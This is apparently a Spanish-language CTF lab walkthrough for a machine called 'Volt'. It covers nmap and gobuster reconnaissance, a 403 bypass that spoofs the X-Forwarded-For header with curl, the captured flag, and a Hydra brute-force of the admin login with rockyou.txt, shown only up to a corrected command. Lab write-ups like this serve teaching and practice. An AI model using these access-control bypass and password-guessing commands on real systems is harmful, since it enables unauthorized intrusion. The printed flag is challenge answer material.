## FASE DE RECONOCIMIENTO
Vamos a ver la IP de la máquina victima con:

```bash
sudo arp-scan -l | grep "PCS"
```
![VoltImage](images/volt/1.png)

Como vemos la IP es--->192.168.1.43 

Vamos a hacer un scaneo de puertos para ver cuales están abiertos, que servicios corren por ellos y sus versiones para ver si son vulnerables:

```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 192.168.1.43 -oN PuertosYservicios
```

![VoltImage](images/volt/2.png)



![VoltImage](images/volt/3.png)


-Puerto 22 por el que corre SSH versión no vulnerable
-Puerto 80 HTTP que es en lo que nos vamos a centrar

lanzo un whatweb y un curl para ver si hay algo interesante, pero quitando que es un nginx nada más

![VoltImage](images/volt/4.png)


Vamos a ver que nos encontramos en la página web:



![VoltImage](images/volt/5.png)


En el código fuente no veo nada interesante, un panel de login etc asi pues vamos a hacer un poco de fuzzing:


```bash
gobuster dir -u http://192.168.1.43/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```
![VoltImage](images/volt/6.png)


veo bastantes rutas pero /api y /secret son interesantes. secret me da un 403, vamos a ver que hace:

![VoltImage](images/volt/7.png)

Tenemos un acceso denegado, vamos a intentar puentearlo, provamos con curl y la cabecera `X-Forwarded-For`

```bash
curl -i -H 'X-Forwarded-For: 127.0.0.1' http://192.168.1.43/secret
```
vemos un 200 OK, parece que lo hemos baypaseado, pero vamos a hacerlo en web para verelo mas bonito porque esta parte me interesa:
``

section class="wrap"><div class="flagbox">
  <span class="granted">&#10003; Internal access granted (127.0.0.1)</span>
  <h1>Volt - Internal Staff Panel</h1>
  <p style="color:var(--muted)">This endpoint is for the internal network only. You successfully bypassed the 403 protection.
  Staff tools are available in the <a href="/admin" style="color:var(--brand)">admin panel</a>.</p>
  <div class="flag">FLAG: CS{403_byp4ss_x_forwarded_for}</div>
  <div class="internal-grid">
```

vamos a modificar la petición con burp y vemos que pasa:

![VoltImage](images/volt/8.png)


![VoltImage](images/volt/9.png)


vale, tenemos acceso al panel de admin:

![VoltImage](images/volt/10.png)


despues de probar varias inyecciones xss etc y sabiendo que el usuario es admn, vamos a lanzar un ataque de fuerzabruta con hydra, capturamos la petición y lanzamos el ataque:

![VoltImage](images/volt/11.png)

lanzamos el ataque:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.43 http-post-form "/admin:username=admin&password=^PASS^:Invalid" -F -I
```

nos da este error:

```
[ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set [ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set [ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set [ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set "1=".
[ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set "1=".
[ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set "1=".
[ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set "1=".
[ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set [ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set [ERROR] received HTTP error code 401. The target may be using HTTP auth, not a web form.  Use module "http-get" instead, or set "1=".
"1=".
"1=".
"1=".
```

lo arreglamos así:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.43 http-post-form "/admin:username=admin&password=^PASS^:1=:Invalid" -F -I 
```



